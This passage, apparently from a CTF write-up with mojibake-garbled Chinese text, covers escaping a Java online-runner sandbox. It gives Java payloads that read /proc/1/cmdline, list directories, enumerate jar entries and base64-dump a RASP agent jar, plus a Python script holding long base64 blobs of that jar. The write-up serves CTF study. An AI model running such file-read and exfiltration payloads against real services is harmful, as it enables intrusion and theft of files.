   out.close();<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h1 id="ä¾‹é¢˜åˆ†æ"><a href="#ä¾‹é¢˜åˆ†æ" class="headerlink" title="ä¾‹é¢˜åˆ†æ"></a>ä¾‹é¢˜åˆ†æ</h1><h2 id="mrctf-2022-springcoffee"><a href="#MRCTF-2022-springcoffee" class="headerlink" title="[MRCTF 2022] springcoffee"></a>[MRCTF 2022] springcoffee</h2><h2 id="å¼ºç½‘æ‹Ÿæ€2024-onlinerunner"><a href="#å¼ºç½‘æ‹Ÿæ€2024-OnlineRunner" class="headerlink" title="å¼ºç½‘æ‹Ÿæ€2024 OnlineRunner"></a>å¼ºç½‘æ‹Ÿæ€2024 OnlineRunner</h2><p>è®°å¾—å½“æ—¶é¢˜ç›®æ˜¯ä¸€ä¸ªåœ¨çº¿çš„javaåœ¨çº¿å‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œç›´æ¥è®©ä½ å†™Mainå‡½æ•°çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥ä¹Ÿæ²¡åŠæ³•importç±»ï¼Œåªèƒ½ç›´æ¥å†™å…¨ç±»å</p><p>å½“æ—¶å°±æ˜¯å°è¯•äº†ä¸€ä¸‹æ­£å¸¸å‘½ä»¤æ‰§è¡Œpayloadå‘ç°ä¸å¤ªè¡Œï¼Œjavaæ²™ç®±ä¹Ÿä¸å¤ªä¼šç»•ä¸è¿‡å»ï¼Œé‚æ‘†ğŸ«¡</p><p>è¿™é¢˜æ²¡æœ‰é™„ä»¶ï¼Œå½“æ—¶ä¹Ÿæ²¡æ€ä¹ˆçœ‹ï¼Œç°åœ¨åªèƒ½çœ‹wpå­¦ä¹ ä¸€ä¸‹</p><p>å…ˆæ˜¯ç”¨ä¸‹é¢çš„payloadä»»æ„æ–‡ä»¶è¯»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>            java.io.<span class="hljs-type">FileReader</span> <span class="hljs-variable">fr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileReader(<span class="hljs-string">&quot;/proc/1/cmdline&quot;</span>);<br>            java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(fr);<br>            String line;<br>            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                System.out.println(line);<br>            &#125;<br>            br.close();<br>        &#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå¾—åˆ°å¯åŠ¨æœåŠ¡çš„å‚æ•°</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java--add-opens=java.base/java.lang=ALL-UNNAMED-javaagent:/home/ctf/sandbox/lib/sandbox-agent.jar-jar/app/app.jar--server.port=80<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯ç»™æ²™ç®±ä¸Šäº†ä¸€ä¸ªagentæ¥æ£€æµ‹ç¨‹åºï¼Œä¹Ÿå°±æ˜¯RASPäº†</p><p>ç„¶åç”¨ä¸‹é¢çš„payloadæ¥åˆ—ç›®å½•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.io.<span class="hljs-type">File</span> <span class="hljs-variable">folder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(<span class="hljs-string">&quot;/&quot;</span>);<br>        java.io.File[] listOfFiles = folder.listFiles();<br><br>        <span class="hljs-keyword">if</span> (listOfFiles != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (java.io.File file : listOfFiles) &#123;<br>                <span class="hljs-keyword">if</span> (file.isFile()) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;File: &quot;</span> + file.getName());<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (file.isDirectory()) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;Directory: &quot;</span> + file.getName());<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;The directory does not exist or is not a directory.&quot;</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢çš„payloadçœ‹jaråŒ…çš„æ¡ç›®ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯ä¸€äº›åŒ…å«çš„æ–‡ä»¶å’Œç›®å½•ä¿¡æ¯</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    java.util.zip.<span class="hljs-type">ZipInputStream</span> <span class="hljs-variable">zis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.zip.ZipInputStream(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileInputStream(<span class="hljs-string">&quot;/app/app.jar&quot;</span>));<br>    java.util.zip.ZipEntry entry;<br>    <span class="hljs-keyword">while</span> ((entry = zis.getNextEntry()) != <span class="hljs-literal">null</span>) &#123;<br>        System.out.println(entry.getName());<br>        zis.closeEntry();<br>    &#125;<br>    zis.close();<br>&#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>    e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨ä¸‹é¢çš„payloadä¸‹è½½agent.jarç„¶ååç¼–è¯‘æŸ¥çœ‹æºç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    java.io.<span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(<span class="hljs-string">&quot;/home/ctf/sandbox/lib/sandbox-agent.jar&quot;</span>); <span class="hljs-comment">// éœ€è¦è¯»å–çš„äºŒè¿›åˆ¶æ–‡ä»¶</span><br><br>    java.io.<span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedInputStream(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileInputStream(file));<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>]; <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªå­—èŠ‚æ•°ç»„ä½œä¸ºç¼“å†²åŒº</span><br>            <span class="hljs-type">int</span> bytesRead;<br><br>            <span class="hljs-keyword">while</span> ((bytesRead = bis.read(buffer)) != -<span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// å¾ªç¯è¯»å–</span><br>                <span class="hljs-comment">// å¤„ç†è¯»å–çš„æ•°æ®ï¼ˆè¿™é‡Œå¯ä»¥è¿›è¡Œæ‰“å°ã€å¤„ç†ç­‰ï¼‰</span><br>                <span class="hljs-comment">//System.out.write(buffer, 0, bytesRead);</span><br>System.out.print(<span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>                System.out.print(java.util.Base64.getEncoder().encodeToString(buffer));<br>System.out.println(<span class="hljs-string">&quot;\&quot;,&quot;</span>);<br><br>            &#125;<br><br><br>        &#125; <span class="hljs-keyword">catch</span> (<br>java.io.IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><p>ç„¶åpythonè„šæœ¬å†™å…¥jaråŒ…</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>data = [<span class="hljs-string">&quot;UEsDBAoAAAAAAAsdRlkAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkYvUEsDBAoAAAAIAAodRllB90L8xgAAAFMBAAAUAAAATUVUQS1JTkYvTUFOSUZFU1QuTUadj8FOwzAQRO+R8g/+gbVacUDKre0NEVSBxH0TT4ghXiN7E6V/j9sq4sKJ486M3uy0LH5AVnpHyj5KY/Z2V1eH1I9+QfqVzxPWOZvNqKtTAiscHS+NOXxzP8K0vEDq6jj7SW96uGTv7oKjJ/dV6I92Z/cPBC4lHxCl08Q5N6aPwfLkO+7Yfi7BZhbXxdXyNWRv0WeepdRcu1noFQ6DF9wBKAhNMzZPE0seYgp/2W9QemEtO6iFjtHRORXWumXKFdjLv16rqx9QSwMECgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAABjb20vUEsDBAoAAAAAAAodRlkAAAAAAAAAAAAAAAAMAAAAY29tL2FsaWJhYmEvUEsDBAoAAAAAAAodRlkAAAAAAAAAAAAAAAAQAAAAY29tL2FsaWJhYmEvanZtL1BLAwQKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L1BLAwQKAAAAAAAKHUZZAAAAAAAAAAAAAAAAHgAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAwQKAAAACAAKHUZZjfQUsW8FAADNCwAANgAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1NhbmRib3hDbGFzc0xvYWRlci5jbGFzc5VWXVcTVxTdF0IGwigaCBRBSykgCWisrVYBrRWhYgNaoliktr0kAwxMZtKZCWq/1+qfaH9AV19xrVZau+xjH/pv+u5qu+9kEgKEpX3IzM255+x9Pu+dv/55+geAS/hWQ4OAvi43Zdo2/PSd+UycGxEdTYgKdBXkhjHp2Dnp3zX9Na48X9q+JzA0nAmMLGmvprO+a9qr48n9ohgEmnW0ICYQnTBt078skKhnuxCDjkMaDivtNlLX+jRpSc/LODJvuALx4aVM7SZtm3FUIJmVdn7ZeVijvGTLguEVZc64NOiNF6W/pt73NbQLHNnx4ebyupHzY0igU0OXjlfQvWu/7CMjWHHcgvQFLtaJYCmzF7BeQlrQg14Nx3WcwKsCZ3JOIS0tc1kuy/T6ZiHtlWNIy1XD9tP7I2I6fafiT7xewnvwmo5+vM6yrph2ft7wnJKbMwT6Dy5ZJZOqBoM6hpR166rhV4wV6rCOJFICh2pR2QkjB8OWfNNKT9mlguFK33TsAH9UxymFo9fge4ogreMM3hBoUwRBtPkgcIHBFzRboBaE/g==&quot;</span>,<br><span class="hljs-string">&quot;po63FEaLwgjESnpex9u4QEqXfNamEcJ2DO/DSC5oGBNo35FPPcwZReW88n1C58ywg1ssuhei1JuEe/u9a8UVvKvhqo5JXBM4GuybDncdz5DLFgvUlFNrgcZh5cb0Ljdur7nOg7LayTqE9QZKIDLp5GnQljFtY65UWDbc22WIeMbJSWtBuqb6Hwoj/prJeM5m/m9PjjMh1UET6Az1Jx3XuCHdadMybnHyBGLVXHoaPhA4Ue29WWmp0TLybMKqEj1SqMxHybUEDu9uVTZi1pe5jVlZrPhPNfrfdUDv0bHdUT8qViI/Wd9kYjfj5XENSzy96upquF+pF4s6c7MmipasuWpLv+SSafzlh2UfO88fGfbc0X3tJSAIn8jUaVzuaWHjU+seJ9uqHa6OvVgTKRWpyb7Zs6FhQ6Bvj3DO8aedkp2vCTj5UhOhaNQM1jkkSR2MwszKLcfzzKBGsWxwUqhuYo33N+FphcJT+6rj+J7vyuKs4a85ea8tCp4BPkoaNtWt9kBgYIfQtDedDSPkLV900zLnO+4jge9rwwgVy6DXyW4Z3kDGcTZKxTrDd5Ch6rk66i+4OkKISWlZWdM3xpvxSN1FzMSY4KE2Y9uGG2TCYIm+5HH5Um5r+LoyggeqkqasjD4eozq/DHh2qJuLqyh/LXgPDbjOlQ8NjXyfTkWeQSw2/s7H6FMl2oaW3UZrKn6k6Rnii40j2cXIaPZXdPyCY49p0YAZPg8H1h28ehO8Hjpxg//6yoh4HxkgWM2SWQSrOa4acFN9q1Byiz9eWnwqXz7jjrJMpEaeoG9WjP6IptGt1Mg2BmZHt7jRGFB2shuAYwykB63oxSEG1k7YHepElTqB+YA6ijZkcZsEdyhthniuvlk4VupOo42i/66W/mQt/UiZPlJDP0DIQdIPkX6Y9MkX0i/gLgk+pFSvShb3OHSvmpmP8HGQ40/IxKsrdPFvvhV7Url4eu7Un2g6taXWZ8civT+gJdUdeYJz3ZGtsUhqpHcb41uE0ulCHy6G7g+x+KoQUaQR48WtLt52nEMXzuM4LgSa/RgLwrlMrXYG+CkkrfvZKsvIcUUHqiEmwxDVKg+DLkdZ0BVaNAbBdlJSxlilZXlvlXsq7H40PoeuYe05jvD5L1UjGno0JAT/go+L1YSshwmxuD6BQtgy6aCGQFPqZxzbqnZlNBBeCYLQywqhwwI2roXGC3w38N2a+g3vCPyESOZxoBxljqbCbosH8c5TdofSLHO2UAPbGsKqaPhJPqPRjoZO4EmRHR3UFi5/D/E5/6kP6y/wFb5B939QSwMECgAAAAgACh1GWZNuBnUfFgAAyS8AADEAAABjb20vYWxpYmFiYS9qdm0vc2FuZA==&quot;</span>,<br><span class="hljs-string">&quot;Ym94L2FnZW50L0FnZW50TGF1bmNoZXIuY2xhc3OtWgl8VNXVP2cykzeZvJAwASQgEpA1q4KghEWSkJBANjMBDKDxkbwkA5OZdGYCpLZudana2iq2Fdxaa0sX2yK0Q4AK2r22drG2dret3fddbal8/3Pfm5mXZNj69Se+9+69557tnvVOnn396HEiWumaoJGLqbQ7MlBphILbjG1G5fadA5UxI9yzLbK70ugzw/HKank2GUPh7n4z6iM3eTTK1kkjL1PBdmOnURkywn2Vrdu2m91xpuwVwXAwvoopa8HCjTnko1yNdJ3yaAKTrsCDkcr6YMhkyouZg0bUiEeitf1GlIlr/WCrQKeJ5Ge6YMDYYdZGwt1GfFMw3o+vWNwIx2NM8xc0pekG4tFguG957cLxc34Ch8LCZJ2m0AVMOSmCTP5M8C4qEurTmJZlojF+KiPVLCrygfQMnS6imUwT+8x4wFJpbW9fmxHvZ5qXAX1GXG6aJRzNZroiw5ZzROKhAi/NZfKoE80Bb/N1WiAayW2q3tBS29DV3LqmTngu0amUynBS8Ui9acSHomazMch08enZHYoHQ5UAWi7bK3SqpEuYtKAcVijEFFgwBsyBSICiQwNiZI2pTyMejISTyMOmLEF9ke4dZry6pydqxmLLvbQIdmbE40Z3v1C9TKcltBRMQ9EtxoAZGzS6zTTTKdIZdCPbr9BpmWz3YntHZIcZlsnlOq2glTi8XdFg3KxWtNrN2FAIJl57TidxJgnEM5iu1Gm1HEJBe11gQ1NHV31jU11XW3VHgw82WyMuVss0OZPqNwpEnU71tBaaMHcHY+IX8LjNstCo0zq1EIyJo8lUk07NMuXtNsKbRCKNWpmmpTG3D4XjwQGzbne3OSgn4Kdsukosr51pts2C7biZ9dhCNRptgF85QRUpBI0O2iTiXI3lMbg2L9zopc04u7mx5cl/Ph9tpWs0ulanLrouyWZGTcKCcWoNkZg6eKZJCzIyt5W26dRNPbBMgLdFonGlrUYf9VKfRv06BWk7Dju9tTEcN/tMxAltpxEaMlt7maYsaHQityGAPUQDGoV1itDgqJBokcc59EaiA0Y8c1DZ4piyYmhm/XZQVKcYSYQ1BgfNMGQpcaKTEBow3zBkhrtTJwQlWyeg9u/UaZcEbU9vaCjWLzPDOr1RzXSHIjGYxJuYCtMYO/qjkV3GNjGg6+kGnW6kmxCzjZ6ewNDgoCjfBA9TnTykdsBCNboliQ1sNLamLEtM5VaxhpvEB27X6Q56K8zcTjq1ISMWa4oYPWZURZ78MT6cS3fR3Rq9Tae30z1gZ9QqrKE7ghCCwLLeHB7jO0nlbhYU79TpXroPRgBzGBONMxyCPQ==&quot;</span>,<br><span class="hljs-string">&quot;pdH9TJecOVsGxonhoz30bpH3PZkzVyb3Fhb36rSPHgSLg0PxMdHf5uecmPbSw0yLwXSFzXQFmK6wma7ojkTNipgZ3WlGK9qikd3DtZgIqLHw/ahO76X3IXGGIIqSiWnuWVKXAgPZ98N3ekyE9ciwRh/ASY4B8dHjtF+nD9GHgR/H0GzG+yOwqNVncRILv5Ni1OwNQdRKCwNIf9QKC42qYuiG/X6MPq7RJ3Q6QE/CZE+3UyJmeCcywBhPtTV5Fk+1p0Rth3T6pPhVvvKrxt62SCwWhFvIsSZ0OiyWlx01ByI7Tck1R3Q6KglossSmaGTQjMaDpgrdUiwIxKd1ekog8lNp2VKMrJ3Q6WlZm5AuMxoiA/DmzwBj2j22G9HKdUbUSghMn9Pp81KcTErvCgwOA8Ai+Qx9UUz2S4iJY4M/jPNZ+opGX9XpOfoa05xzSehIIlbU6ojURCJxrBmDDh8JmEa0G2XRNGfKdnCsMh7TN3T6pjA92VFRwV5TXDN9S6cX6NsoHsVgW6NrzN5g2HQQYlp53mWUYzts60XE3TN6k3CEYrU32Idj8tH36FGNvp88irEIvfRD2Go8ktrgpR+rxF0TDPdo9JNROQmaC5kGAuhL9DOdXpZ8rm+z5jZKkvLSL5jc27DTS7+y6pmmSLcR8tJvkL1sJoutuqm414BeeyokGv9Ojvr3Y/LJeNU4o7skvT/q9CdJqdkhM9wX7/fSX5BJrt0aK5kjq3/T6e/0D8QAZD50DrHTVDKb5dRe0elVgS0Ixloi8RoA7LDWNfoXzjJtEk3B8A6zp8GI9SPa++g18sj2/+j0umzPg9rSe+F/+E/SM7t0zmI3uIsNhoLxzGF44Zbxc17OBoqVcFv26pwjCteCsbqBwfgw6HKuzrpU5gVQNCzNQHFobURi4wk650tx52oNeHkiwviuYFh4KdR5Ek+WSszOVEzTT5/HN3sZONz9cGhBWqTzNEE6aU1dfbWUjIHqljU1rVd3NbQ2S/3OF+o8gy9i8qVZYlp7hhr8fBoJIVCs8yzRQ04wtgmGFtkV8/LFUhtdGVx47ZbKrVuvWbDFKH/jNQvVt4/n8jyN5+u8gBeOOskoaqfdlXBbVCeIDhpcalA1heVnaTVGbVwuBEp1LuPylKXBxxefrTByYGq2NgFTJV+i8aU6LxL5xrHanETu7hUH48vwNefSqkrZt1TnyyUu6VFzMITeoz4YjcW9vAxqCif7ES8vVwlRnYmX0Vp44tJsePlKJiSLauAbRPAXJdfqvEbwTU3HuXRekFDn5Xr43dzYStTLPm7gRo3XoTrk9UnGHdqrGQqGVOQ7g2bHg8P2m5k6l3f39gmR2HAsbg50DUR6hkKmTOBLvQ==&quot;</span>,<br><span class="hljs-string">&quot;7ajSJRYq4yEUEw4wSLQzCHTynVKF4hpiturcNiYHNaudIqKYe7vOATH3qUkz3xCoa5dedUOqUWLeoPNGwTJllLIUVZUVuIFqvNypun9V5wQHvbwFZ3FJhfpPcFyj87XcBU6sJFUfjQw429/W8ZpLqum/8ayNXjYQ9W12BtGNeLkbgeYSOUpT515perzxSDLHP879OgcZDUqhVSHEUWggqa6JDCCASH9mH2PM7B5CvT9cORYGRhLiAY3DOkcYAl10ZnCEUhCqxREHIkNR6aUvHEcivQrkUY5pHNd5iHcm66sMgFZVJinJKgkKFjja/A3tTUC0m4c1fqPO14sKdOei1brZ/Sy/Wecb+EaLzzYjijLDulJKoUyWKwJ8s863CL6cFLAfCW+Wj2/j2zW+Q+e38p2jGzdl7Tb2lONJs+OMH+kVOMvdQC+2XyGO4OO38z0av0Pndyr7zrTHUoY9HvaTl2ZpvAe9SBoYGQI6FH4ra1OfyeTH95HHy++GWiKxCnEtEeceyTB7dd4n4qKsaIrsMqO1Rgyamei46emqXlvX0gH5kpdqqnyQOzEnTEdHdW0DxAoE+8LKF5g2jDb3FRnM/Xzbo+WrEBcvqG2qDgS6Wuu7alvb6/BoqW9cu6G9DhVhaqWtvfXqTmsdUWBjXTsMpK65raOzK9DR3tiCmF2wvq5zVEaEhDLVUt1cF2irrsV4YjJxOuYUjIWyq7ENuTMJI4N8x2JbazuUpieXrWGOAHS0rq9rAabkkj2eKmvgu62uvaOxLpC+4EGsF7eQ9hb1acvQwDYz2iGllZyBlGwbjWhQxvakO94fhMWUn0W7o65ql0uISfcDMBQ07ZZ3Lz9zoXeme7mNkLLX2YKAOYGH4Z4bBmhMMWtx4ut1hNkpo0UfHkyKv+TsZjduRszK1bsL3jcqINj3IYi2wDs5teS4n8CaJySMIOqd6Q5PVQLC3YTREQcKCqDC3gFGbfZzu50NyKLzdxFVH6k+BxpLMRqTkBNO3bT6x9+gYFKRbu1Vvb3V10soGNtNp7SUnltRIhrkeEpLY3oAOO1peiQ4ok011dUASUS1xzLnaI9GX8PbHTTSXBJ4FNu8WW6qjCGJZv7BcX0y5BIl1Y82zuEF/5Xt/A9uqVGgxWwm8nqc3QEsZsfOgNkneKqjUWMYAmdoPjC7Y2ebEYzaoMnN/lGzCoHGP2JqPPsd/Tk7TtaA+GPWDrlE023m7Rwx8P9W6Pm0HDh15OGi01btabHPk5+MtHKSka0mRTNDycc0dK714P9SOYi83hXdIfvXNZ9VUllVj39U4K+QvXDC1EWLdbsVy8/mv/j4r/w3jf+u00T+x5i7G7n5sqlZP7vVG93xSBQm8MCCpg==&quot;</span>,<br><span class="hljs-string">&quot;cYAW0gbEnJAZm9MUiewYOkv5O2qjRPcM4Ge5Y7NR1CLgBRDHUXe9gpjAjC7Fy69BQcxW7+HlfyOfMCPKsh0Xy9XtzHYj6uX/IB6NXosNDltLpxAKOTldkY4yXhdD6czJhsbrymIqVj8OFccjxVH101CxJITiqmJO3q54XR4cRApfuc2cS1OzqXsj1QjC0xrDYZRrEjvNmObyMc09J7VrLj1Z0p8WFNHIAqZZhMxFRJNpmlwm4GuadFnq/SDezA/h20VzMH7YMb6UfPKbocDJz1bqfQe9FeuPyDo/Cvj3OuC/g/H7HOOHMH4sPeZVGL/fMZ6C8eOO8RUYf8AxrsL4g47x1Rjvd4w3Y/whx/g6jD/sGG/D+COO8QqMPzqGnycc49UY59tysvzcjZWPYVQp10p4e0oOU9aTCvTjeGaryWn8CTx1C4APsKz75Gdge/NlUISs+UoOUs5Ryic6MAbDDAcGHx9UDPikT86MoXA8hlmZMMjFqY3hcspSa3mC4SBNOkpTxyOZ60CSl0Ly+TMgmT4eycJMSORqI4XEZSMZoQsVkuLxSMozItl4OoVcPB7DpRkUksOH+JM2hvXA4MI73z/nEM0DLwtLR6h8U/psJ0BYoq3koWvwfa1CN8Xawp9S6OQrwYdBIodHUojvgKPJzun+S23EzWUjtBj/X14mJEaoSohkKSKzYWFE/SAShKa3Uy7tgH2EaBINgMR2WGFEES62UKYIT7cJ+xDSj8AfXXzUllbN8DEwWiI/ZltM8V5oRQPE/cfI13mQVh2m6pbyBK3ZSzPxathLPrzW76OJx6ils/wotREdpsCJY9TRWe4+TBur3EVuf6f2FLk7s0oCne7SQKenLEFbAp3ZeBkjZAZGaEeC3rCpyJ2gIXns3k9FVR77S6/KLvIUZSfozUWeE/spv8othIqA+i0nnoRsy6iXwnQ9DdIQ7ca7gm6FIm+2tbSO5G9EboB2boTt3wSt3AyN3KKgltFt1ER3UoDuos10Ow7rNjLo7cB3DzDeiv/eCUz3AOIdtIf2KG2ugjaW0Xr+NEMgrPj4OJ9Q8fF+XmZr+H5eKXFBfT3Nz0CfuXQnf4Y/C54+h9m15D1JxRr58k7RlfLnMSH1bytmNOog1uj6U5RD2WMWMK3WvK+Rq0ajm3NxTC/Qt3GAYjsftW1n9UG6reQI3emivVTM1uAdLvoAFaa+n6Y9zftp6jHa01lSepje1SwrZUfogSzaVHYgZWDTICohDE+kh6mIHqGF9H5aTI9DBfuVKkpAcR5gP89fULa9OqWA1fxFpYDFcEC1qsTOIdfCkzRJgya/hKEbANfD5b9MtbYIX7FFaHZy2sSlHyT3k6X+hxL0SHOZ/7Gspw==&quot;</span>,<br><span class="hljs-string">&quot;6PEEfbDM/xH7i/GGqTxhvzaVJuigheFTLlJe6VbyzAMHRAcpjw7BKD4JcxiBjEeolI5Cpqeoho7DHE44nKbZligPEj0LORjwi/kr/FWH01gzz9kyIuifpMLRIpbI37hYIrqegU7z4FST4dyLm/EYacHjWJUbz+NVntJj9Eyn+FmRZ4Q+C087TF84Ql92UZlMfH2EnoczZPu/k6DvVmlFmv8HHqigM8sfgl/hIcrwKEcrcmOmHBNPVHmx4SHZkFOUM05nVT5M/sieLPLZs0/TSwn66dLcybn7qAEAP7fIFGlC5tmAArXpeJVHi9r304wqHcCPjcW2qUg/gflfjqey9UCVR5zZ/+siz2H67QmY0UfoeZj09Sh3ssXW7aO7RQI97MNDX0WUeo4K6BsIqM+jNvkW1Ps8FPxdWkTfpyV4V9FLsKifwYtfRkT8JcXpN/Qm+i28+Xfw1z/CE/4KKn+nT9M/6Gv0T+z+Fyi+Qi/Sq/R7eo3+RKfoFfVbEHM2nWKN3ZzDHmUW9yCcv0hT+Wv8dZK/EfsLXwAD8YDmczCQb+Bwa+lz/E0YiAbaD/Hz/C2YRBzmIEaTA/o38AuY84GLbfRj/jblcg7p/B3g84hZqIhM6suK0h4uUEboQqTJ5RfxlQXdePi7+HIrIxRTtag+B6oWrefE1AUbojkpw2ygrFMQU9foLo2eTUYW69/3NHpcI7f1ZBVjik6JXGOA1YpdvX0PMrwKDVqJa6udU6dzCUqwkgT94REqKPH/OUF/3Ueaez+5s55IxRX5IzXiYsrmWciCs1EDFTsS7nT+vvicYtpDrqLVkpdeT1GqsaspKQH+OR63SuA8b1QJMApfruCTn+FsfJsB5Eri20taCfCVHhjDawlpXIqjKsNRlTiyuY1bff1AlYJCRRMqoi6f/G2c5fh8FRBJvr7xGL3WeZj+3QR6J/eSp/RAif9Ugrm57Pg+GZW1lB9f6s5a6pnsmex+jK4qn+xZJD6voLP3U1VRdiF7sEH8/7jnvbSwSMtahNV9NLNIcy9KwvlLZV5mrLh+q4f3n/q4ksxyqXrEdeJL0AItxilchtR/BQx7GerJKpqJBLYEBe5KvhKRr5rWcQ1t4FrqQi1mch3181raBZg38zqljcug2XUovH7IP4L0S6iGfwxtSPa40S47vIAX02bUjn38EuDSEVStwVAt7S0g7SRNhOWdpDyNf/I6efFkRNULoNKTNB+j12jCq3AMyxB/iuOcwRfZKeQunItE7lliiDNKjsB7aR9NKim100mobIR9OOKytCKsI26lCerHpauQNFscKWAW/8zySHy9bGf1Wfxz8ciUAAoq5Wk4/ply/DZ/vwB/s5DyLXObrewGZeVBzg==&quot;</span>,<br><span class="hljs-string">&quot;K+SCBPvFdtlhu5tgNk/TUlueR8GEsFFeUshTDvLUEZ7eNMIz99KMQp49wnNKE1zSXJbgir2UW1bIixO8pMlxyCqF81aY7jU44GvpQu6ii9HplHJ3SsYLcfy/5F8pxsrt+JNLs1VkY4eM5Y5ootJcaVrIX4PpJSmm19q1fi6YvqKQq8B02qMsKfsdHpprEXWQyrVJpZEvy4h8RSGvyoB84DyRH00hD9jI84F8taTkEa4ZRUBV9hyF9Q0BUdRBKH8cofyxhOQ3Q5vQfVChFI3zS8vsWm0mSNZZSbVMcmpZOQirypjXOooYi4EbgOxGmsc3pwoxoOLf8G+Vcc23XU2+Xla5Q77EZrMc7M13OF2WxEyLz99BIU+lFPICzFns7zpRRtMxbugs5KYCq5hHR3KhcDrCLSjpD9I8VPQo7rWDfFWg04vpjkBnQbYUOiLGYd7UXAYZry7kzSO8VT6vK+Rt8pngnrSGS0Cf+DZo+HaaxHciH9xNi/hequI9tIrvoDp+gNr4QdrCDzvc9DrbcD2YP6jctA47RSFON71uzIl4+fepNv1uhYdok5RffmTfvgRD929I8C7UYQl+U4JvOsRT4YPSePJbiA7xVSN8ayHfleC3qbl7MUerjvF9nYf5/kN0WyG/a4Tfk+AHDnHekyk3t/q2pbDVy2kyIejCuC+i5cgUjbSamhFsO6CKPygW/8h/wvsKNIl/xu5/quer6vkv9Typnq/LEwlYni71dKtntkso+fCV48p15VHR/wFQSwECFAMKAAAAAAALHUZZAAAAAAAAAAAAAAAACQAAAAAAAAAAABAA7UEAAAAATUVUQS1JTkYvUEsBAhQDCgAAAAgACh1GWUH3QvzGAAAAUwEAABQAAAAAAAAAAAAAAKSBJwAAAE1FVEEtSU5GL01BTklGRVNULk1GUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAAAAAAAAAAAQAP1BHwEAAGNvbS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAADAAAAAAAAAAAABAA/UFBAQAAY29tL2FsaWJhYmEvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAABAAAAAAAAAAAAAQAP1BawEAAGNvbS9hbGliYWJhL2p2bS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAAAAAAAAABAA/UGZAQAAY29tL2FsaWJhYmEvanZtL3NhbmRib3gvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAB4AAAAAAAAAAAAQAP1BzwEAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAQIUAwoAAAAIAAodRg==&quot;</span>,<br><span 